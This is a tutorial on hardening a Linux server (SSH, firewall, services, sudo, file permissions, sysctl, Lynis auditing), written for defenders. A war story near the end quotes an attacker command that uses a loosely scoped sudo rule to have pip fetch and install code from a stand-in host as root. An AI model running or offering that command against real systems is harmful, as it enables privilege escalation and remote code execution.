## The Problem This Solves

Security isn't something you add once. A default Linux installation ships with services enabled for convenience, not defense. RHEL's `postfix` listening on loopback. Ubuntu's `snapd` socket. SSH accepting password authentication. `/tmp` mounted with exec permissions. World-writable directories scattered across the filesystem. Kernel parameters tuned for networking flexibility, not network-layer attack resistance.

None of these are disasters individually. But together — and on a server facing the internet or a shared network — they form a perimeter with dozens of cracks. An attacker doesn't need to find a zero-day. They need to find one misconfiguration that lets them in, and one more that lets them escalate.

The hardening checklist exists because security has too many components for any human to hold in their head at once. You need a repeatable process: visit each attack surface systematically, reduce it to the minimum required, verify the reduction, and record what you did. Then automate the verification so drift is detected before it becomes a breach.

The companion problem: hardening without a checklist produces inconsistent results. Server A is locked down; server B — provisioned six months later by a different engineer under time pressure — is not. A checklist enforced in automation is the only way to keep ten servers as secure as the one you hardened carefully.

## Mental Model

Think of a new server as a house where every previous tenant left all their keys under the mat, all the windows unlocked, and the alarm system disabled — not out of malice, but because they figured the next person would want maximum flexibility. Hardening is the process of walking through every room, deciding what you actually need open, locking everything else, and then installing an alarm that tells you when something changes.

The discipline is not in the locking. The discipline is in the walk-through: covering every room in the same order, every time, on every server, and never assuming a room is locked because you didn't open it yourself.

## Theory

Hardening is the practice of reducing the attack surface of a system to the minimum required for its intended function. The attack surface is everything an attacker could interact with: listening ports, running services, user accounts with login shells, files with elevated permissions, writable directories, and kernel behaviors that can be exploited.

The organizing principle is **threat modeling**: before you harden anything, you must know what the system does, who uses it, and what you're defending against. A PCI-DSS payment processing server and a developer workstation have different requirements. Applying maximum hardening everywhere creates operational friction without proportional security benefit. Applying minimum hardening everywhere is negligence. The checklist is a framework — you apply judgment at each step.

The hardening discipline rests on three concepts:

**Defense in depth.** No single control is sufficient. SSH key authentication is not a reason to skip firewall rules. A firewall is not a reason to skip file permission audits. The assumption is that any one control will eventually fail; the others must contain the damage.

**Verification over assumption.** Hardening a system without verifying the outcome is not hardening — it's hoping. Every item in a checklist needs a test: a command you can run that confirms the intended state. "SSH password authentication is disabled" is only true if `PasswordAuthentication no` appears in the active configuration and you verified it with `sshd -T`.

**Drift and decay.** A hardened system is only hardened at the moment you verified it. Packages get updated and drop new configuration files. Administrators make changes under pressure. A new service gets installed and opens a port. Hardening decays. Without scheduled re-audits or automated checks, a system hardened last year may not be hardened today.

The CIS Benchmarks — maintained by the Center for Internet Security and updated regularly for RHEL, Ubuntu, Debian, and Rocky Linux — provide a community-consensus checklist organized into two profile levels: Level 1 (baseline, operationally practical) and Level 2 (defense-in-depth, higher friction, suited to high-security environments). They are the closest thing to an industry standard for Linux hardening.

## How It Works (Mechanics)

Each hardening step works on a different layer of the system:

**SSH hardening** modifies `/etc/ssh/sshd_config` and causes `sshd` to re-read its configuration. The verification step queries the compiled effective configuration with `sshd -T`, which shows the resolved value of every parameter — including those inherited from `Include` directives — rather than only what appears literally in the config file.

**Firewall hardening** manipulates the kernel's netfilter subsystem through nftables rules or firewalld's policy layer. The default-deny posture means the kernel drops all packets that do not explicitly match an ACCEPT rule. `ss -tulpn` reads from `/proc/net/tcp`, `/proc/net/tcp6`, `/proc/net/udp`, and their IPv6 equivalents to show what is actually listening — independent of firewall state. The two together give you confirmation: the firewall is denying, and the service is not listening anyway.

**Service disabling** uses systemd's mask operation. A disabled service can still be started manually or by a dependency. A masked service has its unit file symlinked to `/dev/null` — it cannot be started by anything. For services that must never run on a given system, masking is stronger than disabling.

**sysctl hardening** writes kernel parameters to `/etc/sysctl.d/99-hardening.conf`. The kernel reads these at boot via `systemd-sysctl` or `sysctl --system`. Parameters take effect immediately when applied with `sysctl -p /etc/sysctl.d/99-hardening.conf`, but persistence requires the file to survive reboots. `/proc/sys/` exposes the live values — you can read them directly to verify.

**Automatic updates** hand security patches to a daemon that applies them on a schedule. On Debian/Ubuntu, `unattended-upgrades` monitors the `${distro}-security` APT origin and installs matching packages. On RHEL/Rocky/Alma, `dnf-automatic` with `upgrade_type = security` queries the system's configured repositories for packages tagged with a security advisory and applies them.

**Lynis** runs as a shell script that performs over 300 checks across authentication, filesystem, kernel hardening, networking, software, and logging categories. It reads configuration files, queries running processes, checks kernel parameters, and compares the results against its internal rule set. At the end it produces a Hardening Index — a number between 0 and 100 — that represents the proportion of its checks your system passed. It also produces a categorized list of warnings and suggestions. The number itself is secondary to the suggestions list: fix what it found, not the score.

## Real-World Example

This is a complete hardening run on a freshly provisioned Ubuntu 24.04 LTS server that will serve a web application. Walk through each section in order. Every step includes its verification command — never skip verification.

### 1. SSH Hardening

```bash
# Back up the current config before any changes
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# Apply hardened settings
sudo tee /etc/ssh/sshd_config.d/99-hardening.conf > /dev/null << 'EOF'
# Disable password authentication — keys only
PasswordAuthentication no
ChallengeResponseAuthentication no
KbdInteractiveAuthentication no

# Disable root login entirely
PermitRootLogin no

# Limit authentication attempts before disconnect
MaxAuthTries 3

# Keep-alive: server sends a packet every 300 seconds, disconnect after 2 misses
ClientAliveInterval 300
ClientAliveCountMax 2

# Disable X11 forwarding unless you have a specific need for it
X11Forwarding no

# Only allow users who actually need SSH access
# AllowUsers deploy monitoring  # uncomment and adjust

# Strong ciphers — ChaCha20 and AES-GCM are preferred
# The sntrup761x25519 hybrid provides post-quantum key exchange resistance
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com
KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
EOF
```

```bash
# Test the configuration before reloading — a syntax error here locks you out
sudo sshd -t
```

```text
# No output means the configuration is valid
```

```bash
# Verify the effective configuration — sshd -T shows what sshd will actually use
sudo sshd -T | grep -E "passwordauthentication|permitrootlogin|maxauthtries|x11forwarding"
```

```text
passwordauthentication no
permitrootlogin no
maxauthtries 3
x11forwarding no
```

```bash
# Reload — NOT restart — to apply changes without dropping existing connections
sudo systemctl reload ssh
```

> ⚠️ **WARNING:** Do not close your existing SSH session until you have verified you can open a new session with key authentication. Reloading sshd applies the new configuration to new connections — your current session stays open. Open a second terminal, connect with your key, confirm it works. Then close the first session. Locking yourself out of a remote server by misconfiguring SSH is the most common hardening failure. Test before trusting.

### 2. Firewall — Default Deny

```bash
# On Ubuntu 24.04, ufw is the front-end to nftables
# Default policy: deny all inbound, allow all outbound
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow only what this server actually needs
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS

# Enable and check
sudo ufw enable
sudo ufw status verbose
```

```text
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW IN    Anywhere
80/tcp                     ALLOW IN    Anywhere
443/tcp                    ALLOW IN    Anywhere
```

```bash
# Cross-check: verify with ss that only expected ports are listening
sudo ss -tulpn | grep LISTEN
```

```text
tcp    LISTEN  0  128  0.0.0.0:22   0.0.0.0:*  users:(("sshd",pid=954))
tcp    LISTEN  0  511  0.0.0.0:80   0.0.0.0:*  users:(("nginx",pid=2341))
tcp    LISTEN  0  511  0.0.0.0:443  0.0.0.0:*  users:(("nginx",pid=2341))
```

The firewall controls what reaches the service; `ss` tells you what services are actually running. Both are necessary. A firewall blocking port 3306 doesn't mean MySQL isn't running — it just means it's not reachable from outside. If an attacker gains local code execution, an internal MySQL with no password is still a problem.

### 3. Disable Unnecessary Services

```bash
# Identify services that are running but not needed on a web server
# postfix is the classic example — installed by default, rarely needed
sudo systemctl status postfix
```

```bash
# Disable and mask it — disabled prevents auto-start, masked prevents any start
sudo systemctl disable --now postfix
sudo systemctl mask postfix
```

```bash
# Verify it cannot be started
sudo systemctl start postfix
```

```text
Failed to start postfix.service: Unit postfix.service is masked.
```

```bash
# Do a full audit of active services and justify each one
systemctl list-units --type=service --state=active --no-pager | grep -v "UNIT\|●\|^$" | \
  awk '{print $1}' | sort
```

For each service in that list, ask: does this server need this to function? If the answer is no, disable and mask it. Common candidates for removal on minimal web servers: `avahi-daemon`, `bluetooth`, `cups`, `ModemManager`, `rpcbind`, `nfs-client`, `postfix`.

### 4. Automatic Security Updates

```bash
# Debian / Ubuntu
sudo apt install unattended-upgrades -y

# Ensure security-only updates are configured
sudo tee /etc/apt/apt.conf.d/50unattended-upgrades > /dev/null << 'EOF'
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}-security";
    "${distro_id}ESMApps:${distro_codename}-apps-security";
    "${distro_id}ESM:${distro_codename}-infra-security";
};

// Remove packages no longer needed after upgrade
Unattended-Upgrade::Remove-Unused-Dependencies "true";

// Email on errors — replace with your address
Unattended-Upgrade::Mail "root";
Unattended-Upgrade::MailReport "on-change";

// Automatic reboot if required — set to false on production, handle reboots in a maintenance window
Unattended-Upgrade::Automatic-Reboot "false";
EOF

# Enable periodic updates
sudo tee /etc/apt/apt.conf.d/20auto-upgrades > /dev/null << 'EOF'
APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";
EOF

# Verify it runs correctly (dry run)
sudo unattended-upgrade --dry-run --debug 2>&1 | grep -E "Allowed|Checking"
```

### 5. User Account Audit

```bash
# List all accounts with login shells — these can all receive an SSH session
# or a su if their password is known
grep -v '/nologin\|/false\|/sync' /etc/passwd | cut -d: -f1,3,7
```

```text
root:0:/bin/bash
ubuntu:1000:/bin/bash
deploy:1001:/bin/bash
oldadmin:1002:/bin/bash    # <-- who is this?
```

```bash
# Check when accounts last logged in — dormant accounts are attack surface
lastlog | grep -v "Never logged in\|^Username" | sort -k3
```

```bash
# Lock accounts that should not be used for interactive login
# passwd -l sets the password field to ! which prevents password auth
# (key-based SSH still works unless you also set the shell to /sbin/nologin)
sudo passwd -l oldadmin

# Check status of all accounts: P=password set, L=locked, NP=no password
sudo passwd -S -a | sort
```

```text
deploy P 2026-01-15 0 99999 7 -1
oldadmin L 2026-01-15 0 99999 7 -1
root L 2026-01-15 0 99999 7 -1
ubuntu P 2026-01-15 0 99999 7 -1
```

`L` means locked — the account cannot authenticate with a password. Root should be locked on servers where access is via sudo from a named account.

### 6. sudo Configuration Audit

```bash
# Review the entire sudo policy — includes /etc/sudoers.d/
sudo visudo -c   # syntax check only
sudo grep -r "NOPASSWD\|ALL.*ALL" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```

```text
/etc/sudoers:%admin ALL=(ALL) ALL
/etc/sudoers:%sudo  ALL=(ALL:ALL) ALL
/etc/sudoers.d/deploy: deploy ALL=(ALL) NOPASSWD: ALL  # <-- this is a problem
```

`NOPASSWD: ALL` on a user account means anyone who gains a shell as `deploy` immediately has root — no password prompt, no friction, no alerting via failed sudo attempt. Replace it with the minimum required:

```bash
# Replace broad NOPASSWD grant with specific commands only
sudo tee /etc/sudoers.d/deploy > /dev/null << 'EOF'
# deploy can restart the web service and rotate logs — nothing else
deploy ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx, /usr/sbin/logrotate /etc/logrotate.d/nginx
EOF

# Always validate sudoers files with visudo -c after editing
sudo visudo -c -f /etc/sudoers.d/deploy
```

### 7. File Permissions Audit

```bash
# Find setuid binaries — programs that run as their owner regardless of who executes them
# On a minimal server, this list should be short and fully explainable
find / -xdev -perm -4000 -type f 2>/dev/null | sort
```

```text
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/sbin/pam_extrapasswd
```

```bash
# Find setgid binaries
find / -xdev -perm -2000 -type f 2>/dev/null | sort

# Find world-writable files and directories (excluding /tmp, /var/tmp, /dev)
find / -xdev -perm -0002 -type f ! -path "/tmp/*" ! -path "/var/tmp/*" ! -path "/dev/*" \
  2>/dev/null | sort

# Find world-writable directories — these can be used for privilege escalation
find / -xdev -perm -0002 -type d ! -path "/tmp" ! -path "/var/tmp" ! -path "/dev/*" \
  2>/dev/null | sort
```

Anything in the setuid list that you don't recognize, or any world-writable file outside of `/tmp` and `/var/tmp`, needs investigation. Remove setuid bits that are not required:

```bash
# Example: remove setuid from chfn and chsh if users cannot change their own finger info
sudo chmod u-s /usr/bin/chfn
sudo chmod u-s /usr/bin/chsh
```

### 8. Kernel Parameter Hardening

```bash
sudo tee /etc/sysctl.d/99-hardening.conf > /dev/null << 'EOF'
# ---- Network: disable IP source routing (used in some spoofing attacks)
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0

# ---- Network: disable ICMP redirect acceptance (prevent routing table manipulation)
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv6.conf.all.accept_redirects = 0

# ---- Network: do not forward packets between interfaces (this is not a router)
net.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0

# ---- Network: log martians (packets with impossible source addresses)
net.ipv4.conf.all.log_martians = 1

# ---- Network: SYN flood protection
net.ipv4.tcp_syncookies = 1

# ---- Memory: disable core dumps for setuid programs
fs.suid_dumpable = 0

# ---- Memory: restrict /proc access — prevents side-channel information leaks
kernel.dmesg_restrict = 1
kernel.perf_event_paranoid = 3

# ---- Memory: ASLR — address space layout randomization, maximum entropy
kernel.randomize_va_space = 2

# ---- Kernel: restrict ptrace — prevents one process from inspecting another
# unless it's a direct parent. Comment this out if you use debuggers routinely.
kernel.yama.ptrace_scope = 1
EOF

# Apply immediately (also runs at next boot via /etc/sysctl.d/)
sudo sysctl --system
```

```bash
# Verify a representative subset of the applied parameters
sudo sysctl net.ipv4.conf.all.accept_redirects kernel.randomize_va_space fs.suid_dumpable
```

```text
net.ipv4.conf.all.accept_redirects = 0
kernel.randomize_va_space = 2
fs.suid_dumpable = 0
```

## ⚠️ Gotchas

### The SSH Lockout — Every Sysadmin's Rite of Passage

You apply `PasswordAuthentication no`, reload sshd, and your SSH session stays connected. You open a new terminal and try to connect with a password to test — it fails as expected. You disconnect. You try to reconnect with your key. It fails. The server is now inaccessible.

What happened? Your key was in `~/.ssh/authorized_keys` on the server under the root user, but you're trying to connect as `ubuntu`. Or your local `~/.ssh/config` was sending a different key. Or the server's `authorized_keys` file had the wrong permissions (must be `600`, not `644` or `664`).

```bash
# Before applying any SSH hardening change, verify key auth is working
# from a SEPARATE terminal — do this before you change sshd_config
ssh -v -i ~/.ssh/your_key ubuntu@your.server.ip

# Check permissions on the server side (from your existing session)
ls -la ~/.ssh/
```

```text
drwx------ 2 ubuntu ubuntu 4096 Jan 15 09:23 .ssh/        # must be 700
-rw------- 1 ubuntu ubuntu  571 Jan 15 09:23 authorized_keys  # must be 600
```

The fix: always test key authentication in a separate session before reloading sshd. If you do get locked out of a cloud instance, use the cloud console (AWS EC2 Instance Connect, GCP Serial Console, DigitalOcean Recovery Console) to regain access. On a physical server, you need console access or a rescue disk.

### `sshd -T` Versus What's in the File

Editing `/etc/ssh/sshd_config` directly and checking with `grep PasswordAuthentication /etc/ssh/sshd_config` is not verification. Modern OpenSSH uses drop-in files in `/etc/ssh/sshd_config.d/`. If a file in that directory sets `PasswordAuthentication yes`, it overrides what you put in the main file — and your grep missed it.

```bash
# Wrong — only checks the main file
grep PasswordAuthentication /etc/ssh/sshd_config
```

```text
PasswordAuthentication no
```

That looks correct. But:

```bash
# Right — shows the resolved effective configuration
sudo sshd -T | grep passwordauthentication
```

```text
passwordauthentication yes
```

Because `/etc/ssh/sshd_config.d/60-cloudimg-settings.conf` (installed by cloud providers) set it back to `yes`. Always use `sshd -T` to verify. It shows what sshd will actually enforce, not what you think you configured.

### Hardening That Breaks Your Application

`kernel.yama.ptrace_scope = 1` is the right default for a server. It breaks anything that needs to inspect or debug other processes — including some monitoring agents (Datadog, New Relic, some Java profilers) that use ptrace internally. `fs.suid_dumpable = 0` prevents core dumps from setuid programs, which breaks some application crash reporting tools.

Apply kernel parameter changes and then verify your application still works before declaring the hardening complete. Run your test suite or health check against the server after each category of changes, not only at the end.

### `lynis` Score as a Target

"Get the score to 80" is not a security goal. The Lynis hardening index tells you how many of its checks your system passes — nothing more. A score of 80 on a server with an outdated kernel and no EDR is not equivalent to a score of 80 on a fully patched server with active threat monitoring. Some suggestions Lynis makes (like enabling a malware scanner) may be irrelevant for your environment; others it doesn't check at all (like whether your container runtime is misconfigured, or whether your TLS certificates are expiring in three days).

Use the suggestions list, not the number. Fix what applies to your threat model. Ignore what doesn't. Then add checks that Lynis doesn't cover.

### One-Time Hardening Decays

A server you hardened last January has probably drifted. A package update re-enabled a service. An operator added a user account for a contractor who has since left. A deployment script changed permissions on a directory. Someone tested something and opened a firewall rule they forgot to close.

Security configuration decays silently — there are no error messages when drift occurs, and no alerts unless you set them up yourself. The defense against decay is scheduled re-auditing: run `lynis audit system` on a schedule, diff the output against a known-good baseline, and alert on new warnings. This is not optional on any production server that matters.

| Debian / Ubuntu | Automatic updates: `unattended-upgrades`. Config at `/etc/apt/apt.conf.d/50unattended-upgrades`. Drop-in sshd configs land in `/etc/ssh/sshd_config.d/`. UFW sits in front of nftables. Service name is `ssh` (not `sshd`). |
| RHEL / Fedora / CentOS / Rocky / Alma | Automatic updates: `dnf-automatic`. Config at `/etc/dnf/automatic.conf`. Set `upgrade_type = security` and `apply_updates = yes`. Enable with `systemctl enable --now dnf-automatic.timer`. `firewalld` is the default firewall front-end. SELinux is enforcing by default — do not disable it as part of "hardening." |
| Arch | No `unattended-upgrades` — rolling release means you use `pacman -Syu` in a cron or systemd timer. `ufw` available from AUR; `nftables` is preferred natively. Arch installs far fewer default services than Debian or RHEL. |
| Alpine (containers) | Minimal surface by design — most hardening categories are already addressed by the base image. Focus on: dropping unnecessary capabilities from the container runtime, ensuring the image runs as a non-root user, and scanning with Trivy or Grype rather than Lynis. |

## Alternatives & Comparisons

| Tool | When to Use | Notes |
|---|---|---|
| `lynis` | General-purpose security auditing; compliance baseline; ad-hoc hardening verification | Open source; agentless; runs on the system itself; hardening index 0–100; version 3.1.6 current |
| OpenSCAP / `oscap` | When you need to audit against a specific published standard (CIS, STIG, PCI-DSS) and need a machine-readable report | More complex to set up; XCCDF profiles available for RHEL from Red Hat; strong in regulated environments |
| CIS-CAT Lite | When your organization uses CIS Benchmarks formally and needs official scoring | Free tier limited to a subset of benchmarks; Pro version is paid |
| `aide` (Advanced Intrusion Detection Environment) | File integrity monitoring — detecting changes to files after hardening | Baseline snapshots compared on a schedule; catches drift at the file level; not an audit tool |
| `rkhunter` / `chkrootkit` | Quick sweep for common rootkits and suspicious configurations | Supplemental, not comprehensive; known-signature-based; not a substitute for a real audit |

For a first hardening run, `lynis` is the right tool — it requires nothing but `bash`, runs in minutes, and its suggestions list is actionable immediately. For environments with compliance requirements (HIPAA, PCI-DSS, FedRAMP), OpenSCAP against the official profile for your distribution is the right tool because the audit results map directly to control identifiers that auditors recognize.

## Trade-offs

**Where this shines:**

- Reduces the number of services, ports, and accounts an attacker can target — every disabled service and closed port is an attack vector removed
- Produces a documented, repeatable security baseline — you know what state the server is in, and you can verify it
- Automated security updates close known CVEs without requiring manual intervention on every patch Tuesday
- Strong SSH configuration eliminates the largest class of brute-force attacks against internet-facing servers before they have a chance to succeed

**Where this costs you:**

- Operability friction: the tighter the hardening, the more friction for legitimate users. Enforcing `AllowUsers` in sshd means every new operator must be explicitly added. Restricting sudo means every new operational need requires a policy change. Strong ciphers break older SSH clients.
- Recovery complexity: a hardened server where you've lost your SSH key is harder to recover than a permissive one. Make sure you have an out-of-band access path before you lock down everything.
- Application compatibility: some applications assume they can bind to privileged ports, write to world-writable directories, or use setuid helpers. Hardening reveals these assumptions and requires application-side fixes.
- Drift detection overhead: hardening without ongoing verification gives you a false sense of security. Correct hardening requires scheduled re-auditing, which is operational work.

**Performance note:** The sysctl parameters in this file have negligible performance impact. `tcp_syncookies` adds a tiny amount of CPU work per SYN packet — measurable under SYN flood conditions, invisible under normal load.

## When to Use / When to Avoid

✅ **Use this when:**

- Provisioning any internet-facing server — do the full checklist before the server handles real traffic
- After a security incident — use the checklist to verify no attacker-introduced changes persist
- Before a compliance audit — the checklist covers the major CIS Benchmark Level 1 categories
- When onboarding a server that was previously managed by someone else — you don't know what they changed

❌ **Avoid this when:**

- Development workstations where you need interactive debugging, ptrace, and broad sudo access — apply a lighter profile appropriate to the threat model
- Ephemeral container instances — the relevant hardening is at the container runtime and image level, not inside the container with `lynis`
- Blindly applying every Lynis suggestion regardless of your environment — some suggestions are for PCI-DSS environments, some break common tools, and some are simply not relevant to your use case

⚠️ **Common mistakes:**

- Running `lynis` once after provisioning and never again — security configuration drifts; schedule regular re-audits
- Applying hardening to a production server without first testing in staging — `kernel.yama.ptrace_scope`, restrictive cipher lists, and `NOPASSWD` removal have broken production deployments
- Treating firewall rules as sufficient — a firewall blocking port 3306 does not mean MySQL is secure; defense in depth means hardening the service itself, not just its network exposure
- Locking root's password without an alternative way in — if your sudo configuration is also broken, you need console access

## Veteran Perspective

The hardening checklist is where security theory meets operational reality — and the friction is always higher than you expected.

The most dangerous assumption junior sysadmins bring to hardening is that it's a one-time task. You spend a day locking down a server, run `lynis`, get a score of 75, close the ticket, and move on. Three months later, a package update ships a new `/etc/ssh/sshd_config.d/` drop-in. A `postfix` dependency gets pulled in by something else and re-enables the service. A contractor's account gets created for a two-week engagement and never removed. The server is no longer hardened. Nobody knows. There are no alerts. The ticket still says "Hardening — Done."

Hardening that you cannot verify continuously is hardening theater.

The second dangerous assumption is that the score is the goal. I've seen teams celebrate a Lynis score of 85 while running an unpatched kernel with three known CVEs. The score measures how many of Lynis's checks you pass — it says nothing about the things Lynis doesn't check, the things Lynis can't check, and the things specific to your application stack that no generic tool covers. Use the score as a floor, not a ceiling. The suggestions list is the actual work.

Here's what I tell junior engineers about the SSH hardening step: before you change a single line in `sshd_config`, open a second terminal. Connect to the server from that second terminal with key authentication. Verify it works. Keep that session open for the entire hardening process. Change `sshd_config`. Run `sshd -t`. Check `sshd -T`. Reload — do not restart. Then open a third terminal and connect again from scratch. If that works, you're safe to close the original session. If it doesn't, you still have your existing sessions to investigate. This procedure has saved me from self-imposed lockouts more times than I want to count.

The sudo hardening is where the real organizational friction lives. `NOPASSWD: ALL` gets added by developers who need to deploy quickly, by DevOps engineers who got tired of password prompts, and by automation that couldn't figure out how to prompt. By the time someone reviews it, it's been there for two years and nobody knows what breaks if it gets removed. The answer is: test. Add the restrictive rule in a test environment, run the deployment, see what fails. Fix what fails. Then roll it to production. The work is front-loaded, but the security improvement is real — `NOPASSWD: ALL` means every compromised application service is a root compromise.

On the cipher configuration: the `sntrup761x25519-sha512` hybrid key exchange is worth understanding, not just copying into your config. It's a hybrid between a classical elliptic curve exchange (X25519) and a post-quantum lattice algorithm (NTRU Prime). The idea is that if quantum computers powerful enough to break elliptic curve cryptography become available, session keys negotiated today via conventional ECDH could theoretically be stored and decrypted later. The hybrid provides forward secrecy against a future quantum adversary for sessions happening now. This is called "harvest now, decrypt later." It's speculative risk — but for long-lived secrets on systems that matter, it's worth zero extra cost to include it.

One war story: I was called to investigate a compromised server that had passed a hardening audit four months prior. Score of 78, all major items addressed, ticket closed. The breach turned out to be through a developer account that had been granted `ALL=(ALL) NOPASSWD: /usr/bin/pip3` — which the hardening auditor had allowed on the grounds that it was "scoped." The attacker used `sudo pip3 install --target=/tmp/exploit git+https://evil.example.com/pkg.git` and had root in seconds. The lesson: sudo rules that appear scoped to a single binary often aren't, if that binary can execute arbitrary code. Always ask what the binary can do, not just what it's called.

## Try It Yourself

1. Run `ss -tulpn` on any Linux system you have access to and identify every listening port. For each one, find the process name using the `users:` column. Verify you can explain why each service is running.

2. Run `sudo sshd -T | grep -E "passwordauth|rootlogin|maxauthtries|x11forward"` on a system you have SSH access to. Compare the output against a hardened configuration. Note which settings are at their default insecure values.

3. Install `lynis` in a VM (Vagrant, VirtualBox, or a cloud instance), run `sudo lynis audit system`, and read the full suggestions list. Pick three suggestions and research what each one does and whether it applies to your use case.

4. On a test VM, create a user called `testdeploy` with `sudo ALL=(ALL) NOPASSWD: ALL`, then replace it with a rule granting only `NOPASSWD: /usr/bin/systemctl restart nginx`. Verify that `sudo systemctl restart nginx` still works but `sudo bash` does not.

5. **Challenge:** Write a shell script that automates the verification phase of the hardening checklist — not the hardening itself, just the checks. The script should verify: (a) `PasswordAuthentication` is `no` via `sshd -T`; (b) no listening ports exist outside an allowed list you define; (c) `auditd` is active; (d) the sysctl parameters from step 8 match their expected values. Output a PASS/FAIL report for each check. Run it in a VM before and after applying the hardening steps above and confirm all checks move to PASS.

## Summary

- Every default Linux installation has unnecessary services, permissive SSH settings, and accounts you didn't create — the hardening checklist is a systematic sweep of each attack surface before anything else runs on the server.
- SSH hardening without testing from a separate session before reloading sshd is how sysadmins lock themselves out of remote servers; always verify key auth works in a second terminal before closing the first.
- `sshd -T` shows the effective resolved configuration; `grep` on `sshd_config` shows only the main file and misses drop-in overrides from `/etc/ssh/sshd_config.d/`.
- The Lynis hardening index (0–100) measures how many of Lynis's checks your system passes — it is not a percentage of security; the suggestions list is the actionable output, not the number.
- One-time hardening decays: packages, operators, and automation all introduce drift; schedule regular re-audits and alert on new `lynis` warnings or changes to the suggestions list.
